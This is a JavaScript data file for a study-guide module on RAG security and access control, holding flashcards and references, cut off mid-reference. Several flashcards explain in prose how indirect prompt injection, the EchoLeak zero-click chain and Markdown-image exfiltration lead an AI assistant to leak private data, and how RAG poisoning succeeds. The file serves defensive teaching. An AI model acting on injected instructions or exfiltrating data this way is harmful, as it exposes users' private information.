Guide.content._register("w07", {"id":"w07","order":7,"region":"knowledge","title":"RAG Security and ACLs","short":"Secure RAG","tagline":"The model can only leak what retrieval hands it.","story":"The question has been embedded, matched and ranked, and a set of chunks is about to enter the prompt. Some chunks belong to people who should never see them, and some contain instructions written by strangers. Here you decide who enforces access, where, and how you prove it still holds after a permission changes.","oneLiner":"Enforce access in retrieval with the caller's identity, treat every retrieved word as hostile, and test revocation like a feature.","youWillLearn":["Map RAG threats to OWASP LLM Top 10 2025 and MITRE ATLAS ids and name the stage where each one lands","Layer defences against indirect injection, poisoning and exfiltration, and know which layers are probabilistic","Resolve who is asking: on-behalf-of, groups claim overage, nested groups and least-privilege retrieval identities","Choose among post-filter, pre-filter, live check, delegation to the source and physical walls by flipping the dials","Use the ACL simulator to see recall collapse, empty answers and revocation leakage as numbers","Pick among the four Azure AI Search document-level approaches and say what is GA and what is preview","Keep permissions true over time: sync, drift audits, revocation tests, cache scoping and log hygiene","Defend an access control design and run the response to a reported leak"],"minutes":160,"prereqs":["w03","w05"],"flashcards":[{"id":"w07-fc-001","front":"Which OWASP LLM Top 10 2025 id covers cross-tenant leaks in shared vector stores and embedding inversion?","back":"LLM08 Vector and Embedding Weaknesses. Mitigations include permission-aware vector stores with strict logical and access partitioning, data validation and immutable retrieval logs.","tags":["owasp","security"]},{"id":"w07-fc-002","front":"Why is the model never the authorization layer?","back":"A prompt rule is probabilistic and the denied text is already in the context. Enforce access in retrieval and tools, using the caller's identity.","tags":["security","acl"]},{"id":"w07-fc-003","front":"Name the three legs of the Agents Rule of Two.","back":"Untrustworthy input, access to sensitive systems or private data, and the ability to change state or communicate externally. Keep at most two per session, or add human approval.","tags":["injection","design"]},{"id":"w07-fc-004","front":"What did the EchoLeak chain (CVE-2025-32711) combine?","back":"A classifier bypass, reference-style Markdown that evaded link redaction, auto-fetched images and an allowed Teams proxy. One crafted email, zero clicks.","tags":["injection","exfiltration"]},{"id":"w07-fc-005","front":"PoisonedRAG headline result?","back":"About 90% attack success with five malicious texts per target question, injected into a knowledge base of millions of texts. The tested defences were insufficient.","tags":["poisoning"]},{"id":"w07-fc-006","front":"Name the three spotlighting modes.","back":"Delimiting with randomized delimiters, datamarking with a token woven through untrusted text, and encoding such as base64. Probabilistic: attack success fell from above 50% to below 2% in the paper.","tags":["injection"]},{"id":"w07-fc-007","front":"Post-filter over-fetch formula, and what it hides?","back":"k_fetch = k_needed / visible_fraction. At 2% visible and 10 wanted, fetch 500. It also leaks if denied text reaches rerankers, logs or caches before the filter runs.","tags":["acl","post-filter"]},{"id":"w07-fc-008","front":"Why does a pre-filter keep top-k full, and what does it cost?","back":"The filter runs inside the nearest-neighbour search, so only allowed documents compete. ANN recall can degrade under a very selective filter, so measure recall at your real selectivity.","tags":["acl","pre-filter"]},{"id":"w07-fc-009","front":"When does a live source check beat index ACLs?","back":"When revocation must be near immediate or the rules are richer than an index field can hold (deny, sharing links, guests). Cost: latency and source load, so check only the top hits.","tags":["acl","live-check"]},{"id":"w07-fc-010","front":"Entra token group limits and what replaces the claim above them?","back":"JWT 200, SAML 150, implicit flow 6. Above that the groups claim becomes an overage indicator (`hasgroups` or `_claim_names`). Call Graph `transitiveMemberOf` for the list.","tags":["identity","groups"]},{"id":"w07-fc-011","front":"What does the on-behalf-of flow guarantee?","back":"The middle tier exchanges the caller's token for a downstream token using delegated scopes only, so the downstream service sees the user and not a broad service account.","tags":["identity","obo"]},{"id":"w07-fc-012","front":"How does Azure AI Search native ACL enforcement learn who is asking?","back":"The `x-ms-query-source-authorization` header carries the user's Entra token. A document passes if userIds, groupIds or rbacScope matches. Preview as of 2026-10-13.","tags":["azure-ai-search","preview"]},{"id":"w07-fc-013","front":"What changed in `2025-11-01-preview` for native ACL queries with no user token?","back":"ACL filters apply even with an API key or admin role, and a missing token returns only public (`all`) documents. Earlier previews returned everything.","tags":["azure-ai-search","gotcha"]},{"id":"w07-fc-014","front":"Limits on native ACL permission fields?","back":"One field per permission type per index, 1,000 values per userIds or groupIds field, five distinct rbacScope values. Use Entra object ids, not UPNs or emails.","tags":["azure-ai-search","limits"]},{"id":"w07-fc-015","front":"What is the revocation floor for a pull-built index?","back":"The indexer schedule interval has a 5 minute minimum (maximum 1,440). Push ingestion can merge ACL changes immediately, but you then own the change feed.","tags":["sync","revocation"]},{"id":"w07-fc-016","front":"How do you scope an Azure API Management semantic cache safely?","back":"Partition with `vary-by` on user or group id, keep `score-threshold` strict (docs suggest starting near 0.05, above 0.2 may mismatch) and set a TTL below the revocation SLA.","tags":["cache","security"]},{"id":"w07-fc-017","front":"What should a permissioned RAG system log by default?","back":"Identifiers and decision inputs: document ids, principal id, filter hash, outcome. Content copies protected text into a store without ACLs, so capture it only for a bounded, access-controlled window.","tags":["logging","privacy"]},{"id":"w07-fc-018","front":"A SharePoint parent permission changes. Does the AI Search indexer pick it up?","back":"Not per run. Item-level unique ACL changes sync each run from `2026-05-01-preview`; parent scope changes need `/resync` with `options: [\"permissions\"]` or `/resetdocs`.","tags":["sharepoint","sync"]},{"id":"w07-fc-019","front":"What silently disables filtering on an indexed knowledge source?","back":"Creating it without `ingestionPermissionOptions`. The index then has no permission metadata and results come back unfiltered whatever the header says. The option is still preview in the 2026-04-01 API.","tags":["azure-ai-search","gotcha"]},{"id":"w07-fc-020","front":"Does `retrievable: false` on an ACL field secure it?","back":"No. It hides the field from responses only. The filter on the field is the control, and the principal in the filter is only a string until your code derives it from a validated token.","tags":["azure-ai-search","security"]},{"id":"w07-t01-fc1","front":"Which two questions start a RAG threat model?","back":"Who can write into each stage, and what can each stage read or send out. Then mark every point where someone else's text enters the prompt.","tags":[],"topic":"w07-t01"},{"id":"w07-t01-fc2","front":"Which OWASP LLM 2025 id covers cross-tenant leaks in a shared vector store?","back":"LLM08 Vector and Embedding Weaknesses, alongside inversion and poisoning.","tags":[],"topic":"w07-t01"},{"id":"w07-t01-fc3","front":"Name the three legs of the Rule of Two.","back":"Untrustworthy inputs, access to sensitive data or systems, and the ability to change state or communicate externally. Keep at most two in one session.","tags":[],"topic":"w07-t01"},{"id":"w07-t02-fc1","front":"Why does indirect injection need retrieval to cooperate?","back":"The planted chunk must rank for real queries so it enters the prompt. Attackers mimic likely questions, so open or low-quality corpora are most exposed.","tags":[],"topic":"w07-t02"},{"id":"w07-t02-fc2","front":"EchoLeak scores: what must you state with them?","back":"The scorer. CVSS 3.1 base 9.3 from Microsoft and 7.5 from NVD for CVE-2025-32711. NVD published on 2025-06-11.","tags":[],"topic":"w07-t02"},{"id":"w07-t02-fc3","front":"Why are exit-path controls stronger than detection?","back":"They are deterministic: a blocked image host or an approval gate holds whatever the model was tricked into writing. Classifiers are probabilistic.","tags":[],"topic":"w07-t02"},{"id":"w07-t03-fc1","front":"How is data poisoning different from indirect injection?","back":"Poisoning plants false content that retrieval serves as fact. Injection plants instructions that the model may obey. Controls differ: provenance and review versus capability limits.","tags":[],"topic":"w07-t03"},{"id":"w07-t03-fc2","front":"What did PoisonedRAG report?","back":"About 90% attack success with five malicious texts per target question in a knowledge base of millions. The authors found the defences they tested insufficient.","tags":[],"topic":"w07-t03"},{"id":"w07-t03-fc3","front":"Name two ingest-time controls for poisoning.","back":"Source authentication with write control, and provenance fields plus a trust tier on every chunk, so retrieval can exclude low-trust content for high-stakes queries.","tags":[],"topic":"w07-t03"},{"id":"w07-t04-fc1","front":"What does \"similarity is not authorization\" mean?","back":"Nearest-neighbour search returns what is close to the query and knows nothing about the caller. Permission checks must be added to the query or applied by another system.","tags":[],"topic":"w07-t04"},{"id":"w07-t04-fc2","front":"What did Vec2Text show?","back":"Text embeddings can be inverted: 92% of 32-token inputs recovered exactly from embeddings of two models, and full names from clinical notes. Treat vectors as sensitive as the text.","tags":[],"topic":"w07-t04"},{"id":"w07-t04-fc3","front":"What does the Architecture Center advise for shared RAG stores?","back":"A tenant discriminator and user-level filter on every retrieval, an API layer in front of the stores, filters inside agent loops too, and access logs of grounding data.","tags":[],"topic":"w07-t04"},{"id":"w07-t05-fc1","front":"How does Markdown image exfiltration work?","back":"Injected text makes the model write an image URL whose query string holds private data. The client fetches it automatically and the attacker reads the data from request logs.","tags":[],"topic":"w07-t05"},{"id":"w07-t05-fc2","front":"What does OWASP LLM05 advise for model output?","back":"Treat it as untrusted: encode it for its context, validate before passing downstream, and apply a strict content security policy.","tags":[],"topic":"w07-t05"},{"id":"w07-t05-fc3","front":"Is the system prompt a secret or a control?","back":"Neither, per OWASP LLM07. Keep credentials and authorization logic outside the model, and assume the prompt can be read.","tags":[],"topic":"w07-t05"},{"id":"w07-t06-fc1","front":"What two questions does every ACL option answer?","back":"Which component decides, and which stages see text the caller may not read. Post-filters expose denied text to your code, logs and caches. Pre-filters keep it in the index.","tags":[],"topic":"w07-t06"},{"id":"w07-t06-fc2","front":"Name the four dials that choose an ACL option.","back":"Permission model, revocation speed, tenancy and scale (visible fraction, tenant count). Flip one and the ranking can change.","tags":[],"topic":"w07-t06"},{"id":"w07-t06-fc3","front":"Which Azure AI Search document-level approaches are GA as of 2026-10-13?","back":"Only security filters. Native ACL and RBAC scopes, Purview labels and SharePoint ACLs are preview with no SLA.","tags":[],"topic":"w07-t06"},{"id":"w07-t07-fc1","front":"What is the over-fetch formula for a post-filter?","back":"k_fetch = ceil(k_needed / f), where f is the visible fraction. At f = 2% and 10 wanted results, fetch 500. It assumes relevance is independent of permission.","tags":[],"topic":"w07-t07"},{"id":"w07-t07-fc2","front":"What does a post-filter expose that a pre-filter does not?","back":"Denied text reaches your code, rerankers, logs and caches before it is dropped. A pre-filter keeps it inside the index.","tags":[],"topic":"w07-t07"},{"id":"w07-t07-fc3","front":"Which Azure AI Search vector filter mode is the default for newer indexes?","back":"preFilter. Indexes created before about 2023-10-15 default to postFilter and must be recreated to use preFilter.","tags":[],"topic":"w07-t07"},{"id":"w07-t08-fc1","front":"Which field settings does a security filter use in Azure AI Search?","back":"A Collection(Edm.String) field with filterable true and retrievable false. retrievable false hides it from responses but is not field-level security.","tags":[],"topic":"w07-t08"},{"id":"w07-t08-fc2","front":"Does the security filter pattern authenticate users?","back":"No. The principal is only a string. Your code must validate the token, resolve identities and build the filter on the server.","tags":[],"topic":"w07-t08"},{"id":"w07-t08-fc3","front":"Why store an explicit public marker?","back":"If empty means public, a failed ACL capture publishes a restricted document. With empty meaning nobody, the failure hides it instead.","tags":[],"topic":"w07-t08"},{"id":"w07-t09-fc1","front":"What are Azure AI Search's three documented multitenant models?","back":"Index per tenant, service per tenant, or a mix where large tenants get their own service. S3 HD targets many small indexes.","tags":[],"topic":"w07-t09"},{"id":"w07-t09-fc2","front":"How many indexes can an S3 HD service hold?","back":"1,000 per partition or 3,000 per service. S1 allows 50, and S2 and S3 allow 200.","tags":[],"topic":"w07-t09"},{"id":"w07-t09-fc3","front":"What two RLS traps appear in SQL Server and PostgreSQL?","back":"A shared login hides the user unless SESSION_CONTEXT is set (SQL). Owners, superusers and BYPASSRLS roles bypass policies unless the table is forced (PostgreSQL).","tags":[],"topic":"w07-t09"},{"id":"w07-t09-fc4","front":"Why must the server build the vector store filter?","back":"Managed stores trust the filter in the request. A client-supplied filter lets a caller read another tenant's data.","tags":[],"topic":"w07-t09"},{"id":"w07-t10-fc1","front":"What is the usual shape of a live check?","back":"Pre-filter to a short list, check the top hits at the source in parallel with a deadline, refill from spares, and fail closed on timeout.","tags":[],"topic":"w07-t10"},{"id":"w07-t10-fc2","front":"How does Azure AI Search native ACL behave when Graph is down?","back":"It fails closed: the service returns a 5xx and no partially filtered result.","tags":[],"topic":"w07-t10"},{"id":"w07-t10-fc3","front":"Why must a decision cache TTL be shorter than the revocation target?","back":"A cached allow stays valid until it expires, so the TTL is part of the revocation SLA.","tags":[],"topic":"w07-t10"},{"id":"w07-t11-fc1","front":"Which header carries the user's token for native ACL queries?","back":"x-ms-query-source-authorization. For retrieve calls the token scope is https://search.azure.com/.default. Elevated read for debugging uses x-ms-enable-elevated-read.","tags":[],"topic":"w07-t11"},{"id":"w07-t11-fc2","front":"Native ACL limits to remember?","back":"1,000 values per userIds or groupIds field, five distinct rbacScope values per index, 32 ADLS Gen2 ACL entries and 1,000 SharePoint entries per file.","tags":[],"topic":"w07-t11"},{"id":"w07-t11-fc3","front":"What changed in 2025-11-01-preview?","back":"ACL filters now apply even with an API key or admin role, and a missing user token returns only public documents. Earlier previews returned everything.","tags":[],"topic":"w07-t11"},{"id":"w07-t11-fc4","front":"Is native ACL enforcement GA?","back":"No. As of 2026-10-13 it is preview with no SLA. The stable API 2026-04-01 does not include it.","tags":[],"topic":"w07-t11"},{"id":"w07-t12-fc1","front":"What does the SharePoint indexer's ACL support exclude?","back":"Anyone and People in your organization links, external or guest users and Information Management policies. Entra groups nested in SharePoint groups are not expanded.","tags":[],"topic":"w07-t12"},{"id":"w07-t12-fc2","front":"How do parent-scope SharePoint permission changes reach the index?","back":"Not through indexer runs. Call /resync with options [\"permissions\"], or /resetdocs for specific keys.","tags":[],"topic":"w07-t12"},{"id":"w07-t12-fc3","front":"What must you do for Purview labels on chunked indexes?","back":"Project the label onto every chunk row, or chunks are not filtered. Labels also need a system-assigned managed identity and a single tenant.","tags":[],"topic":"w07-t12"},{"id":"w07-t13-fc1","front":"What is the retrieval identity?","back":"The principal under which retrieval runs: the caller (delegated token) or a service account. It decides what the index or source returns.","tags":[],"topic":"w07-t13"},{"id":"w07-t13-fc2","front":"Why does OBO use delegated scopes only?","back":"So roles stay attached to the user and never to the app acting on their behalf, which prevents a user gaining rights they should not have.","tags":[],"topic":"w07-t13"},{"id":"w07-t13-fc3","front":"What must the middle tier do when downstream Conditional Access demands MFA?","back":"Surface the challenge to the client (a 401 with WWW-Authenticate) so the user can step up. Never fall back to the app identity.","tags":[],"topic":"w07-t13"},{"id":"w07-t14-fc1","front":"What happens to the groups claim above the limit?","back":"It is replaced by an overage indicator: hasgroups for the implicit flow, or _claim_names containing groups. Call Graph for memberships.","tags":[],"topic":"w07-t14"},{"id":"w07-t14-fc2","front":"Which Graph call returns nested group memberships?","back":"GET /users/{id}/transitiveMemberOf. Page size is 100 by default and 999 at most. Advanced queries need ConsistencyLevel: eventual and may be stale.","tags":[],"topic":"w07-t14"},{"id":"w07-t14-fc3","front":"How can you avoid group overage?","back":"Choose Groups assigned to the application instead of All groups, or define app roles and authorize on role claims.","tags":[],"topic":"w07-t14"},{"id":"w07-t15-fc1","front":"What is the revocation floor of a pull indexer?","back":"Its next run. The schedule interval is 5 to 1,440 minutes. Push ingestion can update ACLs immediately with merge but you own the change feed.","tags":[],"topic":"w07-t15"},{"id":"w07-t15-fc2","front":"How would you detect ACL drift?","back":"Sample documents daily, compare source and index ACLs, alert on any mismatch, hide mismatches until fixed, and chart the age of the oldest unsynced change.","tags":[],"topic":"w07-t15"},{"id":"w07-t15-fc3","front":"What does revocation include besides permission edits?","back":"Deletes and every cache: index chunks, answer caches, semantic caches and membership caches. Test with a canary document.","tags":[],"topic":"w07-t15"},{"id":"w07-t16-fc1","front":"What do APIM's score-threshold and vary-by do for semantic caches?","back":"score-threshold sets match strictness (lower is stricter, start near 0.05, above 0.2 may mismatch). vary-by partitions the cache, for example by user or group id.","tags":[],"topic":"w07-t16"},{"id":"w07-t16-fc2","front":"Is prompt_cache_key a security control?","back":"No. It routes requests and separates cache accounting. Isolation comes from provider scoping by organization, subscription or workspace and from your own design.","tags":[],"topic":"w07-t16"},{"id":"w07-t16-fc3","front":"What should logs hold by default for permissioned content?","back":"Document ids, principal id, filter hash and the decision. Capture content only for a bounded window under its own access control.","tags":[],"topic":"w07-t16"},{"id":"w07-t17-fc1","front":"What are the three spotlighting modes?","back":"Delimiting (randomized delimiters), datamarking (a token woven through the text) and encoding (base64 or ROT13). It is probabilistic.","tags":[],"topic":"w07-t17"},{"id":"w07-t17-fc2","front":"What is the Azure Spotlighting status as of 2026-10-13?","back":"Preview inside Prompt Shields. Off by default, base64 encodes documents, Chat Completions only, and can raise token counts.","tags":[],"topic":"w07-t17"},{"id":"w07-t17-fc3","front":"What does the CaMeL result teach?","back":"Design-level safety has a cost: 77% of AgentDojo tasks with provable security versus 84% undefended.","tags":[],"topic":"w07-t17"},{"id":"w07-t18-fc1","front":"What are the four LLM06 mitigations?","back":"Minimise extensions, minimise their functions, avoid open-ended extensions (shell, fetch URL) and minimise their permissions, enforced through the identity they use.","tags":[],"topic":"w07-t18"},{"id":"w07-t18-fc2","front":"Which identities should be separate in a RAG system?","back":"Query-time retrieval (the user's token), ingestion (source read, index write), tool execution (task-specific) and admin debugging (dedicated elevated-read role).","tags":[],"topic":"w07-t18"},{"id":"w07-t18-fc3","front":"How does Agent Framework gate a tool call for approval?","back":"Python: @tool with approval_mode always_require, with user_input_requests on the result. .NET: wrap in ApprovalRequiredAIFunction, which yields ToolApprovalRequestContent.","tags":[],"topic":"w07-t18"},{"id":"w07-t19-fc1","front":"What is a canary document test?","back":"A planted document with known permissions and synthetic users. You check that allowed users get it, denied and revoked users do not, and that deletes propagate, end to end.","tags":[],"topic":"w07-t19"},{"id":"w07-t19-fc2","front":"What two metrics gate an ACL release?","back":"Zero leaks as a hard gate, and recall for restricted callers as a watched metric, since a filter that hides everything also fails.","tags":[],"topic":"w07-t19"},{"id":"w07-t19-fc3","front":"Name four ATLAS techniques to red-team a RAG path.","back":"AML.T0051.001 indirect prompt injection, AML.T0070 RAG poisoning, AML.T0064 gather RAG-indexed targets and AML.T0086 exfiltration via agent tool invocation.","tags":[],"topic":"w07-t19"}],"references":[{"id":"r1","title":"OWASP Top 10 for LLM Applications 2025","url":"https://genai.owasp.org/llm-top-10/","type":"spec","publisher":"OWASP GenAI Security Project","note":"The ten ids and mitigations every RAG candidate should cite.","verified":"2026-10-13","status":"n/a"},{"id":"r2","title":"LLM08:2025 Vector and Embedding Weaknesses","url":"https://genai.owasp.org/llmrisk/llm082025-vector-and-embedding-weaknesses/","type":"doc","publisher":"OWASP GenAI Security Project","note":"The RAG-specific risk: unauthorized access, cross-context leaks, inversion and poisoning.","verified":"2026-10-13","status":"n/a"},{"id":"r3","title":"OWASP Top 10 for Agentic Applications: the benchmark for agentic security","url":"https://genai.owasp.org/2025/12/09/owasp-top-10-for-agentic-applications-the-benchmark-for-agentic-security-in-the-age-of-autonomous-ai/","type":"blog","publisher":"OWASP GenAI Security Project","note":"ASI01 to ASI10 with real incidents, published 2025-12-09.","verified":"2026-10-13","status":"n/a"},{"id":"r4","title":"MITRE ATLAS data repository","url":"https://github.com/mitre-atlas/atlas-data","type":"repo","publisher":"MITRE","note":"Technique ids for RAG poisoning, indirect injection and agent exfiltration (release 2026.09).","verified":"2026-10-13","status":"n/a"},{"id":"r5","title":"Not what you've signed up for: Compromising Real-World LLM-Integrated Applications with Indirect Prompt Injection","url":"https://arxiv.org/abs/2302.12173","type":"paper","publisher":"arXiv (Greshake et al.)","note":"Origin and taxonomy of indirect injection.","verified":"2026-10-13","status":"n/a"},{"id":"r6","title":"EchoLeak: The First Real-World Zero-Click Prompt Injection Exploit in a Production LLM System","url":"https://arxiv.org/abs/2509.10540","type":"paper","publisher":"arXiv (AAAI Fall Symposium 2025)","note":"The full exploit chain against a RAG copilot and the mitigations.","verified":"2026-10-13","status":"n/a"},{"id":"r7","title":"PoisonedRAG: Knowledge Corruption Attacks to Retrieval-Augmented Generation","url":"https://arxiv.org/abs/2402.07867","type":"paper","publisher":"arXiv (USENIX Security 2025)","note":"Quantifies how few poisoned texts it takes to steer answers.","verified":"2026-10-13","status":"n/a"},{"id":"r8","title":"Defending Against Indirect Prompt Injection Attacks With Spotlighting","url":"https://arxiv.org/abs/2403.14720","type":"paper","publisher":"arXiv (Microsoft)","note":"The three spotlighting modes and the measured effect.","verified":"2026-10-13","status":"n/a"},{"id":"r9","title":"Defeating Prompt Injections by Design (CaMeL)","url":"https://arxiv.org/abs/2503.18813","type":"paper","publisher":"arXiv (Google)","note":"Control and data flow separation with capabilities, and its utility cost.","verified":"2026-10-13","status":"n/a"},{"id":"r10","title":"Agents Rule of Two: A Practical Approach to AI Agent Security","url":"https://ai.meta.com/blog/practical-ai-agent-security/","type":"blog","publisher":"Meta","note":"A design rule interviewers like to hear, dated 2025-10-31.","verified":"2026-10-13","status":"n/a"},{"id":"r11","title":"Document-level access control in Azure AI Search","url":"https://learn.microsoft.com/en-us/azure/search/search-document-level-access-overview","type":"doc","publisher":"Microsoft Learn","note":"The four approaches and when each fits. Several are preview.","verified":"2026-10-13","status":"preview"},{"id":"r12","title":"Query-time ACL and RBAC enforcement in Azure AI Search","url":"https://learn.microsoft.com/en-us/azure/search/search-query-access-control-rbac-enforcement","type":"doc","publisher":"Microsoft Learn","note":"The query header, fail-closed behaviour, entry limits and the November 2025 change.","verified":"2026-10-13","status":"preview"},{"id":"r13","title":"Security filters for trimming results in Azure AI Search","url":"https://learn.microsoft.com/en-us/azure/search/search-security-trimming-for-azure-search","type":"doc","publisher":"Microsoft Learn","note":"The portable string-match pattern that works on any API version.","verified":"2026-10-13","status":"ga"},{"id":"r14","title":"search.in function in OData filters (Azure AI Search)","url":"https://learn.microsoft.com/en-us/azure/search/search-query-odata-search-in-function","type":"doc","publisher":"Microsoft Learn","note":"Why search.in scales better than a chain of eq and or.","verified":"2026-10-13","status":"ga"},{"id":"r15","title":"Index ACLs and RBAC scopes with the push API (Azure AI Search)","url":"https://learn.microsoft.com/en-us/azure/search/search-index-access-control-lists-and-rbac-push-api","type":"doc","publisher":"Microsoft Learn","note":"The permissionFilter schema, field limits and special values.","verified":"2026-10-13","status":"preview"},{"id":"r16","title":"Use a SharePoint indexer to ingest permission metadata (Azure AI Search)","url":"https://learn.microsoft.com/en-us/azure/search/search-indexer-sharepoint-access-control-lists","type":"doc","publisher":"Microsoft Learn","note":"What SharePoint permissions survive indexing and how they sync.","verified":"2026-10-13","status":"preview"},{"id":"r17","title":"Query a knowledge base via API or MCP (Azure AI Search retrieve action)","url":"https://learn.microsoft.com/en-us/azure/search/agentic-retrieval-how-to-retrieve","type":"doc","publisher":"Microsoft Learn","note":"Permission enforcement for each knowledge source type.","verified":"2026-10-13","status":"preview"},{"id":"r18","title":"Azure AI Search REST API versions","url":"https://learn.microsoft.com/en-us/rest/api/searchservice/search-service-api-versions","type":"doc","publisher":"Microsoft Learn","note":"Which API version is stable and which carries the ACL features.","verified":"2026-10-13","status":"ga"},{"id":"r19","title":"Schedule indexers in Azure AI Search","url":"https://learn.microsoft.com/en-us/azure/search/search-howto-schedule-indexers","type":"doc","publisher":"Microsoft Learn","note":"The 5 to 1,440 minute interval that sets the pull revocation floor.","verified":"2026-10-13","status":"ga"},{"id":"r20","title":"Service limits in Azure AI Search","url":"https://learn.microsoft.com/en-us/azure/search/search-limits-quotas-capacity","type":"doc","publisher":"Microsoft Learn","note":"Index counts per tier and payload limits that decide tenancy.","verified":"2026-10-13","status":"ga"},{"id":"r21","title":"Design a multitenant architecture in Azure AI Search","url":"https://learn.microsoft.com/en-us/azure/search/search-modeling-multitenant-saas-applications","type":"doc","publisher":"Microsoft Learn","note":"Index per tenant, service per tenant and mixed models, with S3 HD guidance.","verified":"2026-10-13","status":"ga"},{"id":"r22","title":"Design a secure multitenant RAG inferencing solution","url":"https://learn.microsoft.com/en-us/azure/architecture/ai-ml/guide/secure-multitenant-rag","type":"doc","publisher":"Microsoft Azure Architecture Center","note":"Store isolation models and the API gatekeeper pattern.","verified":"2026-10-13","status":"n/a"},{"id":"r23","title":"Configure group claims and app roles in tokens","url":"https://learn.microsoft.com/en-us/security/zero-trust/develop/configure-tokens-group-claims-app-roles","type":"doc","publisher":"Microsoft Learn","note":"Group overage thresholds and how to handle them.","verified":"2026-10-13","status":"ga"},{"id":"r24","title":"List a user's transitive memberships (Microsoft Graph)","url":"https://learn.microsoft.com/en-us/graph/api/user-list-transitivememberof","type":"doc","publisher":"Microsoft Learn","note":"Page size, consistency level and nested group expansion.","verified":"2026-10-13","status":"ga"},{"id":"r25","title":"Microsoft identity platform and OAuth 2.0 On-Behalf-Of flow","url":"https://learn.microsoft.com/en-us/entra/identity-platform/v2-oauth2-on-behalf-of-flow","type":"doc","publisher":"Microsoft Learn","note":"Delegating the user's identity to downstream APIs.","verified":"2026-10-13","status":"ga"},{"id":"r26","title":"Overview of the Microsoft 365 Copilot Retrieval API","url":"https://learn.microsoft.com/en-us/microsoft-365-copilot/extensibility/api/ai-services/retrieval/overview","type":"doc","publisher":"Microsoft Learn","note":"Permission-honoring retrieval without copying data. Pay-as-you-go consumption is preview.","verified":"2026-10-13","status":"preview"},{"id":"r27","title":"Set up notifications for changes in resource data (Microsoft Graph)","url":"https://learn.microsoft.com/en-us/graph/change-notifications-overview","type":"doc","publisher":"Microsoft Learn","note":"Subscription quotas, expiry and latency for permission sync.","verified":"2026-10-13","status":"ga"},{"id":"r28","title":"llm-semantic-cache-lookup policy (Azure API Management)","url":"https://learn.microsoft.com/en-us/azure/api-management/azure-openai-semantic-cache-lookup-policy","type":"doc","publisher":"Microsoft Learn","note":"vary-by and threshold guidance for scoping a semantic cache.","verified":"2026-10-13","status":"ga"},{"id":"r29","title":"Auditing Prompt Caching in Language Model APIs","url":"https://arxiv.org/abs/2502.07776","type":"paper","publisher":"arXiv (ICML 2025)","note":"Timing side channels when caches were shared across users.","verified":"2026-10-13","status":"n/a"},{"id":"r30","title":"Prompt caching in Azure OpenAI","url":"https://learn.microsoft.com/en-us/azure/foundry/openai/how-to/prompt-caching","type":"doc","publisher":"Microsoft Learn","note":"Cache scope per subscription and idle lifetime.","verified":"2026-10-13","status":"ga"},{"id":"r31","title":"Row-level security (SQL Server and Azure SQL)","url":"https://learn.microsoft.com/en-us/sql/relational-databases/security/row-level-security","type":"doc","publisher":"Microsoft Learn","note":"Filter and block predicates, SESSION_CONTEXT and the side-channel warning.","verified":"2026-10-13","status":"ga"},{"id":"r32","title":"PostgreSQL row security policies","url":"https://www.postgresql.org/docs/current/ddl-rowsecurity.html","type":"doc","publisher":"PostgreSQL Global Development Group","note":"Default deny, BYPASSRLS and FORCE ROW LEVEL SECURITY.","verified":"2026-10-13","status":"n/a"},{"id":"r33","title":"Hierarchical partition keys in Azure Cosmos DB","url":"https://learn.microsoft.com/en-us/azure/cosmos-db/hierarchical-partition-keys","type":"doc","publisher":"Microsoft Learn","note":"Tenant partitioning and the 20 GB logical partition limit.","verified":"2026-10-13","status":"ga"},{"id":"r34","title":"Implement multitenancy with Pinecone namespaces","url":"https://docs.pinecone.io/guides/index-data/implement-multitenancy","type":"doc","publisher":"Pinecone","note":"One namespace per tenant and offboarding by deleting the namespace (vendor claims).","verified":"2026-10-13","status":"n/a"},{"id":"r35","title":"Delta query overview (Microsoft Graph)","url":"https://learn.microsoft.com/en-us/graph/delta-query-overview","type":"doc","publisher":"Microsoft Learn","note":"Fetch changes since the last sync with a delta token.","verified":"2026-10-13","status":"ga"},{"id":"r36","title":"Study: AI security fundamentals learning path","url":"https://learn.microsoft.com/en-us/training/paths/ai-security-fundamentals/","type":"course","publisher":"Microsoft Learn","note":"Structured start on AI-specific attacks and controls.","verified":"2026-10-13","status":"n/a"},{"id":"r37","title":"Study: Red Teaming LLM Applications","url":"https://www.deeplearning.ai/short-courses/red-teaming-llm-applications/","type":"course","publisher":"DeepLearning.AI","note":"Hands-on probing of LLM apps for injection and leakage.","verified":"2026-10-13","status":"n/a"},{"id":"r38","title":"Data, privacy and security for Azure OpenAI","url":"https://learn.microsoft.com/en-us/azure/ai-foundry/responsible-ai/openai/data-privacy","type":"doc","publisher":"Microsoft Learn","note":"Stateful features persist prompts at rest in your resource, so they need retention and deletion rules.","verified":"2026-10-13","status":"ga"},{"id":"tr1","title":"LLM01:2025 Prompt Injection","url":"https://genai.owasp.org/llmrisk/llm01-prompt-injection/","type":"spec","publisher":"OWASP GenAI Security Project","note":"Defines direct and indirect injection and says RAG and fine-tuning do not fully mitigate it.","verified":"2026-10-13","status":"n/a"},{"id":"tr2","title":"LLM02:2025 Sensitive Information Disclosure","url":"https://genai.owasp.org/llmrisk/llm022025-sensitive-information-disclosure/","type":"spec","publisher":"OWASP GenAI Security Project","note":"Disclosure through model output and the least-privilege and access control mitigations.","verified":"2026-10-13","status":"n/a"},{"id":"tr3","title":"LLM04:2025 Data and Model Poisoning","url":"https://genai.owasp.org/llmrisk/llm042025-data-and-model-poisoning/","type":"spec","publisher":"OWASP GenAI Security Project","note":"Poisoning of pre-training, fine-tuning and embedding data, framed as an integrity attack.","verified":"2026-10-13","status":"n/a"},{"id":"tr4","title":"LLM05:2025 Improper Output Handling","url":"https://genai.owasp.org/llmrisk/llm052025-improper-output-handling/","type":"spec","publisher":"OWASP GenAI Security Project","note":"Treat model output as untrusted: encoding, validation, content security policy.","verified":"2026-10-13","status":"n/a"},{"id":"tr5","title":"LLM06:2025 Excessive Agency","url":"https://genai.owasp.org/llmrisk/llm062025-excessive-agency/","type":"spec","publisher":"OWASP GenAI Security Project","note":"Minimise extensions, functions and permissions, and avoid open-ended extensions.","verified":"2026-10-13","status":"n/a"},{"id":"tr6","title":"LLM07:2025 System Prompt Leakage","url":"https://genai.owasp.org/llmrisk/llm072025-system-prompt-leakage/","type":"spec","publisher":"OWASP GenAI Security Project","note":"The prompt is not a secret or a control. Keep credentials and authorization outside it.","verified":"2026-10-13","status":"n/a"},{"id":"tr7","title":"Text Embeddings Reveal (Almost) As Much As Text","url":"https://arxiv.org/abs/2310.06816","type":"paper","publisher":"arXiv (Morris et al., EMNLP 2023)","note":"Vec2Text recovers 92% of 32-token inputs exactly from embeddings, so vectors are not anonymous.","verified":"2026-10-13","status":"n/a"},{"id":"tr8","title":"Prompt Shields in Azure AI Content 